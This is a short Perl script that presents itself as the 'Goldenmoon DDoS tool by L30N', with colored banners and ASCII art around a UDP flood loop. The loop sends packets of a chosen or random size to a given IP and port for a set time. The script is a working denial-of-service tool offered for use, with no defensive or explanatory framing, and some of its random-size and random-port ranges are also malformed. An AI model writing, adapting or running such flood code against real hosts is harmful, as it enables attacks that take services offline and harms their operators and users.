#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

print BOLD RED "IP first";

print BOLD YELLOW "port Second\n";

print BOLD YELLOW "packets third";

print BOLD BLUE  "seconds last\n";
 
############
# L30N b4ck<----
############
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD YELLOW<<EOTEXT;

#################################################################################
#                             aaaaaaaaaaaaaaaa               *                  #
#                         aaaaaaaaaaaaaaaaaaaaaaaa                              #
#                      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                           #
#                    aaaaaaaaaaaaaaaaa           aaaaaa                         #
#                  aaaaaaaaaaaaaaaa                  aaaa                       #
#                 aaaaaaaaaaaaa aa                      aa                      #
#*               aaaaaaaa      aa                         a                     #
#                aaaaaaa aa aaaa                                                #
#          *    aaaaaaaaa     aaa                                               #
#               aaaaaaaaaaa aaaaaaa                               *             #
#               aaaaaaa    aaaaaaaaaa                                           #
#               aaaaaa a aaaaaa aaaaaa                                          #
#                aaaaaaa  aaaaaaa                                               #
#                aaaaaaaa                                 a                     #
#                 aaaaaaaaaa                            aa                      #
#                  aaaaaaaaaaaaaaaa                  aaaa                       #
#                    aaaaaaaaaaaaaaaaa           aaaaaa        *                #
#      *               aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                           #
#                         aaaaaaaaaaaaaaaaaaaaaaaa                              #
#                      *      aaaaaaaaaaaaaaaa                                  #
#################################################################################         IP: $ip
                                                                                          PORT: $port
                                                                                         PACKETS: $size
                                                                                         TIME: $time
 

Ferramenta de DDoS Por L30N $ip with $size packets.

-Goldenmoon DDoS tool by L30N.
Author: L30N               
       
EOTEXT
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "~ DDoS is love DDoS is live~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Fuck all") . "
~ Attacking $ip.
~ #0FFL1N3 ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}

 
               
       
